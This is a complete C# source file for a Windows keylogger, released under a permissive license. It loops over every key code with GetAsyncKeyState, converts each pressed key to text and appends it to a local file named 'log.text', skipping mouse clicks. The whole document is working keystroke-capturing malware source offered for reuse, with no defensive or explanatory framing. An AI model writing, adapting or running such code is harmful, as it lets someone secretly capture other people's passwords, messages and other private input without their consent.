/* KeyLogger
 * This program is free software. It comes without any warranty, to
 * the extent permitted by applicable law. You can redistribute it
 * and/or modify it under the terms of the Do What The Fuck You Want
 * To Public License, Version 2.
 */

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        //Delay, used when no key is pressed to reduce cpu usage.
        const short Delay = 50;

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        private static string key = string.Empty;

        static void Main()
        {
            int keysCount = Enum.GetValues(typeof(Keys)).Length;//Get the length of avaible keys.

            while (true)
            {
                for (int i = 0; i < keysCount; i++)//Loop for every key.
                    if (GetAsyncKeyState(i) == -32767)//Check if key is pressed.
                        key += Enum.GetName(typeof(Keys), i);//Add key as string to Keys.

                //If no key is pressed, wait x milliseconds.
                if (key.Length <= 0)
                {
                    Task.Delay(Delay).Wait();
                    continue;
                }

                //Key is pressed, continue.
                //Ingenore LButton and RButton, these are mouse clicks.
                if (key.Equals("LButton")) { key = string.Empty; continue; }
                if (key.Equals("RButton")) { key = string.Empty; continue; }

                key = key.Replace("Enter", Environment.NewLine);//Replace Enter for a new line.
                key = key.Replace("Space", " ");//Replace Space for a real space.

                File.AppendAllText("log.text", key);//Write key to file.
                key = string.Empty;//clear key.
            }
        }
    }
}
